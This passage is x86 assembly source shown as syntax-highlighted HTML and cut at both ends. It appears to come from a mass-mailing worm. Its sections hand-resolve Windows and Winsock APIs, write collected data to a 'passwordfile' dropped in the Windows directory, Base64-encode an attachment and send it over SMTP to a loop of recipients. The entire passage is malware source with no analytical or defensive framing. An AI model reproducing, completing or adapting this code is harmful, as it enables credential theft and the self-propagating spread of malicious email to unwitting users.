    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EncodeBase64</span><span class="sc0">

    </span><span class="sc5">AddTwoBytes</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">AddOneByte</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EncodeBase64</span><span class="sc0">

    </span><span class="sc5">AddOneByte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

    </span><span class="sc5">EncodeBase64</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">encTable</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">  

    </span><span class="sc5">BaseLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">AddEndOfLine</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc5">AddedEndOfLine</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">BaseLoop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">AddEndOfLine</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">AddedEndOfLine</span><span class="sc0">

</span><span class="sc5">BASE64_ENCODER</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;=======================[ ic-ws_write_to_file.inc ]=========================;</span><span class="sc0">

</span><span class="sc5">WRITE_TO_FILE</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">StoreBuffer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">SetEmailDropDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SET_WINDIR</span><span class="sc0">

    </span><span class="sc5">CreateEmailDrop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; template handle=0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                    </span><span class="sc1">; attributes=any file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">                    </span><span class="sc1">; type= existing file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; security option = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">; shared for read</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">         </span><span class="sc1">; generic read write</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">passwordfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; offset file name</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; save file handle</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">BufferError</span><span class="sc0">

    </span><span class="sc5">SetDropPointer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; filehandle</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">WriteBuffer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">writtenbytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; push buffersize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">; push offset buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AWriteFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc5">CloseBufferFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">BufferError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">WRITE_TO_FILE</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;============================[ ic-send_mail.inc ]============================;</span><span class="sc0">

</span><span class="sc5">SEND_MAIL</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">GetAllApiAddresses</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_WSOCK32_BASE_ADDRESS</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_USER32_BASE_ADDRESS</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PREPARE_ATTACHMENT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; attachment error</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SendError</span><span class="sc0">

    </span><span class="sc5">AllocateEmailBufferMemory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">encodedsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGlobalAlloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SendError</span><span class="sc0">                    </span><span class="sc1">; mem for email</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_buffer_address</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; buffer</span><span class="sc0">

    </span><span class="sc5">SendMailFromTag</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendCommand</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReceiveReply</span><span class="sc0">

    </span><span class="sc5">SendRcptToTags</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totalrcptsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        
    </span><span class="sc5">RcptSendLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcpt_size_address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcpt_buffer_address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totalrcptsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendCommand</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReceiveReply</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totalrcptsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcptnumber</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">RcptSendLoop</span><span class="sc0">

    </span><span class="sc5">SendDataCommand</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">datatag</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendCommand</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReceiveReply</span><span class="sc0">

    </span><span class="sc5">EmailBody_EmailId</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_buffer_address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">emailid</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21d</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">email_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

